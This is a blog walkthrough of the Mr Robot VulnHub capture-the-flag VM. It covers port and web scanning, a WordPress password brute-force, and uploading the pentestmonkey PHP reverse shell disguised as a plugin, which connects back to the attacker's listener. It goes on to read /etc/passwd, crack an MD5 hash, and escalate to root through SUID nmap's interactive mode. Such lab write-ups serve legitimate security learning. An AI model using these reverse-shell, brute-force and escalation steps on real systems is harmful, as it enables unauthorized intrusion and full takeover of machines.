---
title: Mr Robot Vulnhub Challenge Walkthrough
category: Application Security
tags: ["PHP", "Linux"]
date: 2019-01-19
--- 

I had some extra time this weekend so I decided to play Mr Robot hacking challenge. I heard a lot about that challenge but I didn't have time to hack it. 
Now was the time. I downloaded the virtual machine image from vulnhub, fired up virtulbox, started kali linux vm.

Enumeration time, I always start with port scanning to see what services are running but to do so I need to find the machine's IP first. The easy way to do so is to use `netdiscover`. 

I added machine's IP to my hosts:
```
echo "192.168.0.67  mrrobot.local" >> /etc/hosts
```
Started Nmap scan:
```
# nmap -sV -A -T4 mrrobot.local
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 08:30 EST
Nmap scan report for mrrobot.local (192.168.0.67)
Host is up (0.00077s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http    Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 08:00:27:05:4F:5A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.77 ms mrrobot.local (192.168.0.67)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.77 seconds

```

As we can see above Apache was running on port 80 (HTTP) and 443 (HTTPS). So I launched Nikto to  run a scan on the website: 
```
nikto -host http://mrrobot.local/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.69
+ Target Hostname:    mrrobot.local
+ Target Port:        80
+ Start Time:         2019-01-18 08:34:48 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                         
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                                         
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://mrrobot.local/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7445 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2019-01-18 08:40:17 (GMT-5) (329 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

It seemed that we were dealing with a wordpress website, I ran wpscan on it and nothing interesting was returned. Usualy when I test a website I start by looking at robots.txt, we never know what it can reveals.

```
$ curl http://mrrobot.local/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

First key found:
```
$ curl http://mrrobot.local/key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
```

I downloaded fsocity.dic locally:
```
$ curl http://mrrobot.local/fsocity.dic -o fsocity.dic
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7075k  100 7075k    0     0  20.3M      0 --:--:-- --:--:-- --:--:-- 20.3M
```
fsocity.dic:
```
true
false
wikia
from
the
now
Wikia
extensions
scss
window
http
var
page
Robot
Elliot
styles
and
document
mrrobot
com
ago
function
eps1
null
chat
user
Special
GlobalNavigation
images
net
push
category
Alderson
...
```
The file contained some familiar names related to Mr Robot theme such as `Robot`, `Elliot`, `mrrobot`, `Alderson`. Next step was to look at wordpress login page, the page suffred from information disclosure vulnerabilty, when putting an incorrect user, the page returned this error:

```
Error: invalid username.
```

Being Mr Robot themed vm, my thougt was that the username would be based off characters on the show, I stared to test the list mentionned above, I was correct the user name was: `Elliot`

My first attempt was to use the first key we found as Elliot's password but it failed my next step was to find what hash type the key was, it seemed to be unvalid md5 hash. From there I decided to use wpscan to perform a dictionary attack using the provided wordlist `fsocity.dic` on Wordpress instance.

![wp_bruteforce](/images/mrrobot_wp_bruteforce.png)

Two hours later, I got the password: `ER28-0652`.

So I logged in and pocked arround, my next mission was to get a shell on the machine. That could be easily done by uploading a PHP reverse shell as wordpress plugin. I used [PentestMonkey PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), I added on top of the php source code a valid WP plugin comment, zipped it and uploaded.

```
<?php
/**
* @package Pwn Me
 */
/*
Plugin Name: Pwn Me
Plugin URI: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Description: Pwning Mr Robot Hacking Challenge<script>alert(0)</script>
Version: 3.1.5
Author: @ibrahimdraidia
Author URI: https://blog.ibrahimdraidia.com/
License: GPLv2 or later
Text Domain: Pwn Me
*/

// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.36';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
...
```

Once plugin uploaded I activated it and I got a shell on my listenner:
```
# nc -lvp 4444
listening on [any] 4444 ...
connect to [192.168.0.36] from mrrobot.local [192.168.0.67] 43098
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 13:33:33 up  2:18,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Logged in as deamon, time to explore, I always start by listing users on the machine:
```
$ less /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
$ 
```
The user robot looked intersting:
```
$ cd /home/robot
$ ls
key-2-of-3.txt
password.raw-md5
$ less key-2-of-3.txt
key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
$ 
```
I used [www.md5online.org](https://www.md5online.org/md5-decrypt.html) to decrypt robot's password hash.

![robot_hash](/images/robot_decrypted_hash.png)

In order to change to robot user I had to launch an interactive shell, one solution was to use pty python module, python is installed by default on most linux distributions.

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su - robot              
su - robot
Password: abcdefghijklmnopqrstuvwxyz

$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
$ cat ke*
cat ke*
822c73956184f694993bede3eb39f959
$ 
```

Second key found: `822c73956184f694993bede3eb39f959`

One step closer to pwn this box. At this point I started to pock arround. I found those services running:

```
$ netstat -lnp
netstat -lnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::443                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:13947           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp6       0      0 :::49019                :::*                                -               
...
``` 

Those three services: FTP, Monit Linux, MySQL respectivly were listenning on local interface. Monit Linux caught my eye, I never dealt with it before. So I started googling for it but I quickly, got fed up. 

At this point I started looking for programs with SUID root privileges.
```
$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
$ 
```

`/usr/local/bin/nmap` looked like a good candidate, old versions of this software had --interactive option, which meant I could run command as root:
```
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !id
!id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
waiting to reap child : No child processes
nmap> 
```

I ran `!sh` to start sh session as root: 
```
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 
```

Third key found: `04787ddef27c3dee1ee161b21670b4e4`

Until now I don't know what those keys are used for, should I dig deeper ? I don't know. I suppose that's it for this time.

I realy enjoyed this vm, thanks [Leon Johnson](https://www.vulnhub.com/author/leon-johnson,292/) for creating and making it avaible.
